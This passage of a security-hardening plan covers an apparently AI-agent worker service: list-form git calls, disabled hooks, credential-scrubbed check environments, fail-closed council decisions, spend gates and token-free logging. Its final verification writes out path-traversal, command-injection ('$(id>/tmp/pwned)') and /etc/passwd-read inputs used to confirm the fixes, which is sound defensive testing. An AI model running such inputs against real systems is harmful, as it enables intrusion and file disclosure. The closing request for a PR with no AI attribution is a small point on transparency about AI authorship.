Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py -k "list_form or disables_hooks" -v`
Expected: FAIL — `shell=True` is passed, and `GIT_CONFIG_COUNT` is `"1"`

- [ ] **Step 3: Write minimal implementation**

Replace `run_git` (`git_ops.py:13-39`):

```python
def run_git(
    cmd: list[str],
    cwd: str | None = None,
    check: bool = True,
    timeout: int = 120,
) -> str:
    """Run a git command with git-safe env vars. Returns stdout.

    Takes argv as a list — never a shell string. Repo and branch names are
    caller-supplied and reach this function, so no shell is involved at all.
    Hooks are disabled: a crow can write files into the worktree, and
    `.git/hooks/pre-commit` would otherwise execute on the next commit.
    """
    env = os.environ.copy()
    env["GIT_TERMINAL_PROMPT"] = "0"
    env["GIT_CONFIG_COUNT"] = "2"
    env["GIT_CONFIG_KEY_0"] = "safe.directory"
    env["GIT_CONFIG_VALUE_0"] = "*"
    env["GIT_CONFIG_KEY_1"] = "core.hooksPath"
    env["GIT_CONFIG_VALUE_1"] = "/dev/null"
    if GITHUB_TOKEN:
        env["GH_TOKEN"] = GITHUB_TOKEN

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        cwd=cwd,
        env=env,
        timeout=timeout,
    )
    if check and result.returncode != 0:
        raise RuntimeError(
            f"Command failed: {' '.join(cmd)}\nstderr: {result.stderr}"
        )
    return result.stdout.strip()
```

Apply the same two hook env vars to `_git_commit_with_stdin_message` (`git_ops.py:179-183`), setting `GIT_CONFIG_COUNT` to `"2"` there as well.

Convert all 20 `git_ops.py` call sites to list form. The complete set:

```python
run_git(["git", "status", "--porcelain"], cwd=repo_dir, check=False)
run_git(["git", "fetch", "origin"], cwd=repo_dir)
run_git(["git", "clone", clone_url, repo_dir])
run_git(["git", "config", "user.email", "cawnex-worker@cawnex.ai"], cwd=repo_dir)
run_git(["git", "config", "user.name", "Cawnex Worker"], cwd=repo_dir)
run_git(["git", "worktree", "remove", worktree_dir, "--force"], cwd=repo_dir, check=False)
run_git(["git", "worktree", "prune"], cwd=repo_dir)
run_git(["git", "fetch", "--prune", "origin"], cwd=repo_dir)
run_git(["git", "branch", "-D", worktree_branch], cwd=repo_dir, check=False)
run_git(["git", "rev-parse", "--verify", f"origin/{branch}"], cwd=repo_dir, check=False)
run_git(["git", "worktree", "add", worktree_dir, "-b", worktree_branch, start_ref], cwd=repo_dir)
run_git(["git", "config", "user.email", "cawnex-worker@cawnex.ai"], cwd=worktree_dir)
run_git(["git", "config", "user.name", "Cawnex Worker"], cwd=worktree_dir)
run_git(["git", "add", "-A"], cwd=worktree_dir)
run_git(["git", "diff", "--cached", "--name-only"], cwd=worktree_dir, check=False)
run_git(["git", "rev-parse", "HEAD"], cwd=worktree_dir)
```

Note the `git config user.email/name` pairs appear twice (repo_dir and worktree_dir) — both convert. The push call is handled in Task 7.

Convert the 2 `executor.py` call sites (`:135`, `:139`):

```python
    diff_content = run_git(
        ["git", "diff", f"{base_branch}..HEAD"], cwd=worktree_dir, check=False
    )
    changed_files_raw = run_git(
        ["git", "diff", "--name-only", f"{base_branch}..HEAD"], cwd=worktree_dir, check=False
    )
```

- [ ] **Step 4: Run the full worker suite**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests -q`
Expected: PASS — every test, including the pre-existing `run_git` mocks in `test_git_ops.py:21-40` which assert on argv

- [ ] **Step 5: Typecheck**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m mypy --strict src/worker/`
Expected: `Success`

- [ ] **Step 6: Commit**

```bash
git add lambdas/worker/src/worker/git_ops.py lambdas/worker/src/worker/executor.py \
        lambdas/worker/tests/test_git_ops.py
git commit -m "fix(worker): drop shell=True from git execution and disable hooks"
```

- [ ] **Step 7: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Find a converted call site whose behavior changed — especially any that relied on shell globbing, quoting, or `~` expansion. `git config user.email "cawnex-worker@cawnex.ai"` previously passed literal quotes through the shell; confirm the list form does not now embed them in the value. Verify `GIT_CONFIG_COUNT=2` is honored by the installed git version and that `core.hooksPath=/dev/null` does not break `git worktree add`. Confirm no `run_git` call site was missed (search the whole repo, including the integrator).

---

### Task 7: Fix the push path and scrub the integrator environment

**Files:**
- Modify: `lambdas/worker/src/worker/git_ops.py:153-174` (`commit_and_push`), `lambdas/worker/src/worker/integrator/checks/{tests,lint,typecheck}.py`
- Test: `lambdas/worker/tests/test_git_ops.py`, `lambdas/worker/tests/test_integrator_checks.py` (create if absent)

**Interfaces:**
- Consumes: `run_git(list[str], ...)` from Task 6; `_validate_branch` from Task 5.
- Produces: `commit_and_push(worktree_dir, message, repo, branch, github_token) -> str` — unchanged signature; now pushes the crow-scoped branch and uses `--force-with-lease`.

**Why:** F7 — `git_ops.py:97` renames the *local* branch when it is `main`, but `:172` pushes the caller's `branch`, so the guard never covers the push. And F6 — the integrator's `pytest` runs merged PR code with `GITHUB_TOKEN`, `ANTHROPIC_AUTH_TOKEN`, and the AWS task role all inherited.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_git_ops.py — append
@patch("worker.git_ops._git_commit_with_stdin_message")
@patch("worker.git_ops.run_git")
def test_push_never_targets_main(mock_git: MagicMock, _commit: MagicMock) -> None:
    """F7: a branch of 'main' must be pushed as the crow-scoped branch."""
    mock_git.side_effect = lambda cmd, **kw: "changed.py" if "--cached" in cmd else "sha"
    commit_and_push("/wt", "msg", "owner/repo", "main", "tok")
    pushed = [c.args[0] for c in mock_git.call_args_list if "push" in c.args[0]]
    assert pushed, "expected a push"
    assert "main" not in pushed[0]


@patch("worker.git_ops._git_commit_with_stdin_message")
@patch("worker.git_ops.run_git")
def test_push_uses_force_with_lease(mock_git: MagicMock, _commit: MagicMock) -> None:
    mock_git.side_effect = lambda cmd, **kw: "changed.py" if "--cached" in cmd else "sha"
    commit_and_push("/wt", "msg", "owner/repo", "cawnex/w01-m01", "tok")
    pushed = [c.args[0] for c in mock_git.call_args_list if "push" in c.args[0]]
    assert "--force-with-lease" in pushed[0]
    assert "--force" not in pushed[0]
```

```python
# lambdas/worker/tests/test_integrator_checks.py
"""F6: integrator checks must not hand credentials to repo-authored code."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

from worker.integrator.checks.tests import run_tests


@patch("worker.integrator.checks.tests.subprocess.run")
def test_run_tests_scrubs_credentials(mock_run: MagicMock) -> None:
    mock_run.return_value = MagicMock(returncode=0, stdout=b"", stderr=b"")
    with patch.dict(
        "os.environ",
        {"GITHUB_TOKEN": "ghp_secret", "ANTHROPIC_AUTH_TOKEN": "sk-secret",
         "SECRET_DB": "pw", "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI": "/v2/creds"},
        clear=False,
    ):
        run_tests("/integration")
    env = mock_run.call_args.kwargs.get("env")
    assert env is not None, "checks must pass an explicit env"
    for leaked in (
        "GITHUB_TOKEN", "ANTHROPIC_AUTH_TOKEN", "SECRET_DB",
        "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
    ):
        assert leaked not in env
    assert "PATH" in env
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_git_ops.py tests/test_integrator_checks.py -k "push or scrubs" -v`
Expected: FAIL — push contains `main` and bare `--force`; checks pass `env=None`

- [ ] **Step 3: Write minimal implementation**

In `git_ops.py`, make the crow-scoped branch the single source of truth. Extract the naming rule so `create_worktree` and `commit_and_push` cannot disagree:

```python
def _push_branch(branch: str, crow_id: str = "") -> str:
    """The branch actually pushed. Never main/master."""
    if branch in ("main", "master"):
        return f"cawnex/{crow_id}" if crow_id else "cawnex/detached"
    return branch
```

Have `create_worktree` (`git_ops.py:97`) call `_push_branch(branch, crow_id)` instead of inlining the ternary, and change the push (`git_ops.py:171-172`):

```python
    push_branch = _validate_branch(_push_branch(branch, crow_id))
    push_url = f"https://x-access-token:{github_token}@github.com/{repo}.git"
    run_git(
        ["git", "push", "--force-with-lease", push_url, push_branch], cwd=worktree_dir
    )
```

`commit_and_push` needs `crow_id` to build the fallback name — add it as a keyword parameter with a `""` default and pass it from `executor.py:428`.

In each of `integrator/checks/tests.py:17`, `lint.py:19`, `lint.py:47`, `typecheck.py:17`, pass an explicit scrubbed environment. Add a shared helper in `lambdas/worker/src/worker/integrator/checks/env.py`:

```python
"""Minimal environment for check subprocesses.

These run repository-authored code (pytest executes whatever is in the merged
tree), so they must not inherit worker credentials or the task-role endpoint.
"""

from __future__ import annotations

import os

_KEEP = ("PATH", "HOME", "LANG", "LC_ALL", "TMPDIR", "PYTHONPATH")


def check_env() -> dict[str, str]:
    """Return a credential-free environment for a check subprocess."""
    return {k: os.environ[k] for k in _KEEP if k in os.environ}
```

Then in each check: `env=check_env()` on the `subprocess.run` call.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests -q`
Expected: PASS — full suite

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/git_ops.py lambdas/worker/src/worker/integrator/ \
        lambdas/worker/src/worker/executor.py lambdas/worker/tests/
git commit -m "fix(worker): push crow-scoped branch with lease, scrub check env"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Confirm `create_worktree` and `commit_and_push` now agree on the branch in every path, including the `start_ref`/`origin/{branch}` lookup at `git_ops.py:102` which still uses the *original* branch. Determine whether `--force-with-lease` breaks the legitimate sequential-crow flow where a later crow builds on an earlier crow's push. Check whether stripping `PATH`-adjacent vars breaks `pytest`/`mypy` discovery in the container (virtualenv activation often relies on `VIRTUAL_ENV`).

---

# Phase 3 — Decision and budget gates

### Task 8: Fail closed on insufficient context

**Files:**
- Modify: `lambdas/council/src/council/enums.py:38`, `synthesis.py:77-82`, `actions.py:46-52`
- Test: `lambdas/council/tests/test_synthesis.py`, `lambdas/council/tests/test_actions.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `CouncilDecision.insufficient_context: bool = False` (new field on the dataclass at `models.py:173`, serialized in `to_dict`). `actions.execute_decision` honors it before the `auto_mode` branch.

**Why:** F4 — `_exception_to_abstain` (`orchestrator.py:147`) plus `return_exceptions=True` means six crashed advisors become six abstains, which `synthesis.py:77-82` turns into ESCALATE, which `actions.py:51` auto-approves in full-auto. An API outage ships a wave.

**Design (D5):** preserve the operator's intent. A *genuine split vote* escalating to Monarch in full-auto is a coherent product stance and stays. *Inability to decide* must not be read as approval.

> **⚠️ SIGN-OFF REQUIRED.** This is the only task that changes product behavior. Confirm with the user before implementing — in full-auto, waves that previously shipped on mass-abstain will now block.

**Prerequisite:** `docker run -d -p 8000:8000 --name cawnex-ddb amazon/dynamodb-local` — without it `test_actions.py` errors after ~154s.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/council/tests/test_synthesis.py — append
from council.enums import AdvisorType, DecisionAction, VoteType
from council.models import AdvisorCost, AdvisorVote, VotingRound
from council.synthesis import synthesize_round


def _abstain(advisor: AdvisorType) -> AdvisorVote:
    return AdvisorVote(
        advisor=advisor, vote=VoteType.ABSTAIN, scores={},
        reasoning="advisor crashed: TimeoutError", confidence=0.0,
        cost=AdvisorCost.zero(),
    )


def test_all_abstain_marks_insufficient_context() -> None:
    """F4: six crashed advisors -> abstains -> must be marked, not approved."""
    votes = [_abstain(a) for a in AdvisorType]
    decision = synthesize_round(
        VotingRound(round_number=1, votes=votes), round_number=1, max_rounds=3
    )
    assert decision.action == DecisionAction.ESCALATE
    assert decision.insufficient_context is True
```

```python
# lambdas/council/tests/test_actions.py — append
# execute_decision's real signature is
# (blackboard, pk, wave_id, session_id, decision, auto_mode) — session_id is
# positional and required. Mirror the existing TestExecuteDecision setup in
# this file for the Blackboard/table fixture rather than inventing one.


def test_insufficient_context_does_not_deliver_in_full_auto(dynamodb_table) -> None:
    """F4: six crashed advisors must not ship the wave."""
    blackboard = Blackboard(dynamodb_table)
    decision = CouncilDecision(
        action=DecisionAction.ESCALATE,
        reasoning="All advisors abstained — insufficient context",
        confidence=0.0,
        insufficient_context=True,
    )

    execute_decision(blackboard, "T#t#P#p", "w01", "sess01", decision, "full")

    wave = blackboard.get("T#t#P#p", "S#w01")
    assert wave.get("status") != "delivered"


def test_genuine_split_still_escalates_to_monarch_in_full_auto(dynamodb_table) -> None:
    """D5 no-regress: a real split vote keeps the existing behavior."""
    blackboard = Blackboard(dynamodb_table)
    decision = CouncilDecision(
        action=DecisionAction.ESCALATE,
        reasoning="No clear majority",
        confidence=0.6,
        insufficient_context=False,
    )

    execute_decision(blackboard, "T#t#P#p", "w01", "sess01", decision, "full")

    wave = blackboard.get("T#t#P#p", "S#w01")
    assert wave.get("status") == "delivered"
```

Seed the wave row before calling `execute_decision` exactly as the existing `TestExecuteDecision` tests do — `_deliver_wave` updates a row that must already exist.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/council && PYTHONPATH=src python3 -m pytest tests/test_synthesis.py tests/test_actions.py -k "insufficient or split" -v`
Expected: FAIL — `TypeError: unexpected keyword argument 'insufficient_context'`

- [ ] **Step 3: Write minimal implementation**

Add the field to `CouncilDecision` (`models.py:173`), after `confidence`:

```python
    insufficient_context: bool = False
```

Include it in `to_dict` alongside the other scalars.

Set it at the mass-abstain site (`synthesis.py:77-82`):

```python
    if not non_abstain:
        return CouncilDecision(
            action=DecisionAction.ESCALATE,
            reasoning="All advisors abstained — insufficient context",
            confidence=0.0,
            insufficient_context=True,
        )
```

Honor it in `actions.py:46-52`:

```python
    elif decision.action == DecisionAction.ESCALATE:
        if decision.insufficient_context:
            # The council could not form a view — advisors crashed or abstained.
            # Inability to decide is not approval; always surface to a human.
            _notify_human(blackboard, pk, wave_id, decision)
        elif auto_mode == "supervised":
            _notify_human(blackboard, pk, wave_id, decision)
        else:
            # Genuine split vote — in full auto, Monarch makes the final call.
            _deliver_wave(blackboard, pk, wave_id)
            _write_continuation_task(blackboard, pk, wave_id, decision)
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/council && PYTHONPATH=src python3 -m pytest tests/test_synthesis.py tests/test_actions.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add lambdas/council/src/council/
git commit -m "fix(council): block delivery when advisors cannot form a view"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Find another route to delivery when the council has no real signal — e.g. one surviving advisor with self-reported `confidence: 1.0` clearing the `approval_ratio >= 0.6` bar at `synthesis.py:122`, or the veto path at `synthesis.py:27` when the Security advisor is the one that crashed. Confirm `insufficient_context` survives serialization through DynamoDB and back (`to_dict` and the read path). Check `execute_planning_decision` (`actions.py:55`) for the same fail-open shape.

---

### Task 9: Enforce per-crow spend

**Files:**
- Modify: `lambdas/worker/src/worker/executor.py:201-206`, `apps/api/src/routes/waves.py:41`
- Test: `lambdas/worker/tests/test_executor.py`, `apps/api/tests/test_waves.py`

**Interfaces:**
- Consumes: `calculate_credits(tokens_in, tokens_out) -> int` (`worker/cost.py:11`, microdollars).
- Produces: `_projected_spend(crow_type: CrowType) -> int` in `executor.py` — the worst-case microdollar cost of one crow run, used as the pre-flight bound.

**Why:** F5 — verified that `check_crow_budget`/`check_mvi_budget` (`murder/cost.py:61,70`) have zero non-test call sites, and every wave-level check passes `proposed=0` (`reactor.py:91,205,471`), so it only ever asks "have we already overspent?" A crow with $0.01 remaining proceeds and may spend 25 iterations × 32,768 output tokens.

**Scope (D6):** wire a pre-flight bound and cap the client-supplied limit. A reservation/ledger system is out of scope — that is `docs/superpowers/plans/2026-07-02-deterministic-wave-core.md`'s territory.

> **⚠️ Calibration — read before implementing.** With `PRICE_PER_OUTPUT_TOKEN = 15` (`config.py:30`), the worst-case projection is:
>
> | Crow | Max output | Projection | vs. $20 default wave budget |
> |---|---|---|---|
> | implementer / fixer | 32,768 × 25 | **$12.29** | first crow runs, second blocked with $7.71 left |
> | planner / reviewer | 8,192 × 25 | **$3.07** | fine |
>
> A pure worst-case bound would **break every multi-crow wave** at the default budget. Real spend is far below the ceiling — `_compute_safe_max_tokens` (`claude.py:141-156`) clamps output, and most crows finish in a few turns, not 25.
>
> Therefore: apply a **realism divisor** to the loop factor rather than assuming all 25 turns hit the output ceiling. Use `CLAUDE_MAX_ITERATIONS // 5` (5 effective turns) as the projection basis, giving an implementer bound of ~$2.46. Step 3 below encodes this. If the adversary or a reviewer disputes the divisor, the fallback is to gate on a fixed floor (e.g. "refuse if under $1 remaining") — but do **not** ship a bound that blocks legitimate waves, and do not silently raise the default budget to accommodate a pessimistic formula.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_executor.py — append
# Uses the helpers already defined at the top of this file:
# _make_snapshot(**overrides), _make_logger(), _make_config().
# Note execute()'s real signature: execute(snapshot, logger, config=None).


@patch("worker.executor.call_claude")
def test_crow_refuses_when_projected_spend_exceeds_budget(mock_claude: MagicMock) -> None:
    """F5: budget_remaining > 0 is not enough — the next call must fit."""
    snapshot = _make_snapshot(budget_remaining=1)  # 1 microdollar

    result = execute(snapshot, _make_logger(), _make_config())

    assert result["status"] == "failed"
    assert "budget" in result["error"].lower()
    mock_claude.assert_not_called()


@patch("worker.executor.cleanup_worktree")
@patch("worker.executor.create_worktree", return_value="/efs/worktrees/cr_impl_01")
@patch("worker.executor.ensure_repo", return_value="/efs/owner_repo")
@patch("worker.executor.call_claude")
def test_crow_proceeds_when_budget_covers_projection(
    mock_claude: MagicMock,
    _ensure: MagicMock,
    _create: MagicMock,
    _cleanup: MagicMock,
) -> None:
    mock_claude.return_value = _make_claude_result()
    snapshot = _make_snapshot(budget_remaining=500_000_000)

    execute(snapshot, _make_logger(), _make_config())

    mock_claude.assert_called()
```

`_make_snapshot` already defaults `budget_remaining` to `5_000_000`, so the second test raises it above the projection rather than relying on the default. Reuse these helpers — do not invent new ones.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_executor.py -k projected -v`
Expected: FAIL — the crow proceeds and calls Claude with 1 microdollar remaining

- [ ] **Step 3: Write minimal implementation**

In `executor.py`, add the projection above `execute`:

```python
# Most crows terminate in a few turns via submit_result, and
# _compute_safe_max_tokens clamps output well below the ceiling. A full
# MAX_ITERATIONS x max_tokens bound projects $12.29 for an implementer,
# which would block the second crow of every wave on the $20 default
# budget. Project a realistic run instead of the absolute worst case.
EFFECTIVE_TURNS = CLAUDE_MAX_ITERATIONS // 5


def _projected_spend(crow_type: CrowType) -> int:
    """Microdollar cost of a realistic crow run, used as a pre-flight bound.

    This gates whether we start, not what we bill — actual spend is recorded
    from real token counts after the call (executor.py:368).
    """
    max_out = 32_768 if crow_type in (CrowType.IMPLEMENTER, CrowType.FIXER) else 8_192
    return calculate_credits(0, max_out) * EFFECTIVE_TURNS
```

Import `calculate_credits` from `worker.cost` and export `MAX_ITERATIONS` from `claude.py` as `CLAUDE_MAX_ITERATIONS` (it is currently the literal default `25` at `claude.py:166` — promote it to a module constant and use it in the signature default so the two cannot drift).

Replace the budget check (`executor.py:201-206`):

```python
    # Budget check — the next run must fit, not merely "something remains".
    projected = _projected_spend(crow_type)
    if budget_remaining <= 0 or budget_remaining < projected:
        logger.warning(
            "crow_budget_exhausted",
            crow_id=crow_id,
            budget_remaining=budget_remaining,
            projected=projected,
        )
        result = _build_failed(
            crow_type,
            f"Budget insufficient: {budget_remaining} remaining, {projected} projected",
        )
        validate_crow_completion(result)
        return result
```

In `apps/api/src/routes/waves.py:41`, bound the client value:

```python
    budget_micros: int = Field(default=_DEFAULT_BUDGET_MICROS, gt=0, le=_MAX_BUDGET_MICROS)
```

Define `_MAX_BUDGET_MICROS` next to `_DEFAULT_BUDGET_MICROS` — set it to 100× the default and add a comment that it is a guardrail against a fat-fingered or hostile client, not a product limit.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests -q` and `cd apps/api && python3 -m pytest tests/test_waves.py -v`
Expected: PASS both

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/executor.py lambdas/worker/src/worker/claude.py \
        lambdas/worker/tests/test_executor.py apps/api/src/routes/waves.py apps/api/tests/test_waves.py
git commit -m "fix: gate crow execution on projected spend and bound wave budget"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Interrogate the `EFFECTIVE_TURNS = MAX_ITERATIONS // 5` divisor — it is a judgment call, not a derived constant. At $2.46 per implementer, a $20 wave fits 8 crows; determine whether real waves exceed that and would now be blocked mid-flight, leaving MVIs stranded in `running`. Conversely, determine whether a crow that *does* run all 25 turns can overspend by 5× with no mid-loop check (it can — say so, and judge whether that is acceptable given this is a pre-flight gate, not a ledger). Check whether `budget_remaining` can be negative and how that interacts. Verify the `le=` bound does not break existing clients posting the current default.

---

### Task 10: Stop logging credential prefixes

**Files:**
- Modify: `apps/worker/main.py:20-23`, `lambdas/worker/src/worker/claude.py:127-133`
- Test: `lambdas/worker/tests/test_claude.py`

**Interfaces:**
- Consumes: nothing.
- Produces: nothing.

**Why:** F9 — 12–15 characters of a live OAuth token written to CloudWatch on every container start. Low severity, trivially fixed, and it removes a standing finding from any future audit.

- [ ] **Step 1: Write the failing test**

```python
# lambdas/worker/tests/test_claude.py — append
import inspect
import worker.claude


def test_no_token_slicing_in_logs() -> None:
    """F9: never log any prefix of a live credential."""
    source = inspect.getsource(worker.claude)
    assert "token[:" not in source
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_claude.py -k token_slicing -v`
Expected: FAIL — `claude.py:127-133` slices the token

- [ ] **Step 3: Write minimal implementation**

In `claude.py`, replace the token-prefix log with a presence-and-shape log that discloses nothing:

```python
        log.info(
            "anthropic auth configured: len=%d, has_newline=%s, sdk=%s",
            len(token),
            "\n" in token,
            anthropic.__version__,
        )
```

Apply the identical change at `apps/worker/main.py:20-23`, dropping `token[:15] + "..."`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests/test_claude.py -v`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add lambdas/worker/src/worker/claude.py apps/worker/main.py lambdas/worker/tests/test_claude.py
git commit -m "fix(worker): stop logging live token prefixes"
```

- [ ] **Step 6: Adversary gate**

Run `/adversary-coder` on this diff.

**Adversary brief:** Search the whole repo for other credential disclosure in logs or exceptions — particularly `git_ops.py:56,171` where the token is embedded in a clone/push URL that appears in `RuntimeError(f"Command failed: {cmd}")` on failure. That error message is the more serious instance of this class; report it if the fix did not cover it.

---

## Final verification

- [ ] **Full suites green**

```bash
cd lambdas/worker && PYTHONPATH=src python3 -m pytest tests -q
cd lambdas/council && PYTHONPATH=src python3 -m pytest tests -q   # needs DynamoDB Local
cd apps/api && python3 -m pytest tests -q
```

- [ ] **Typecheck and lint**

```bash
cd lambdas/worker && PYTHONPATH=src python3 -m mypy --strict src/worker/ && python3 -m black --check src tests
cd lambdas/council && PYTHONPATH=src python3 -m mypy --strict src/council/ && python3 -m black --check src tests
```

- [ ] **Re-run the original reproductions — every one must now fail to exploit**

```bash
# F1 — writes must be contained
python3 -c "
import sys; sys.path.insert(0,'lambdas/worker/src')
from worker.git_ops import apply_changes
try:
    apply_changes('/tmp/wt', [{'path':'../pwned.txt','action':'create','content':'x'}])
    print('STILL VULNERABLE')
except ValueError as e:
    print('contained:', e)
"

# F2 — repo slug must be rejected
python3 -c "
import sys; sys.path.insert(0,'lambdas/worker/src')
from worker.git_ops import _normalize_repo
try:
    _normalize_repo('owner/repo\$(id>/tmp/pwned)')
    print('STILL VULNERABLE')
except ValueError as e:
    print('rejected:', e)
"

# F3 — council must not read /etc/passwd
python3 -c "
import sys; sys.path.insert(0,'lambdas/council/src')
from council.tools.filesystem import read_file
r = read_file('/etc/passwd', root='/tmp')
print('STILL VULNERABLE' if 'content' in r else 'contained: %s' % r)
"
```

- [ ] **Adversary verdicts recorded** in `docs/superpowers/reviews/2026-08-28-agent-isolation-hardening-adversary-review.md`, one section per task, each `merge` / `fix` / `rework` with the findings absorbed.

- [ ] **Confirm nothing load-bearing regressed:** no `merge_pr` in `lambdas/`; `tool_choice={"type":"any"}` intact; secret-scrubbing `finally` blocks intact; `TenantDB` key derivation untouched.

- [ ] **Open one PR** covering all three phases, body summarizing the closed findings by ID (F1–F9) with no AI attribution.
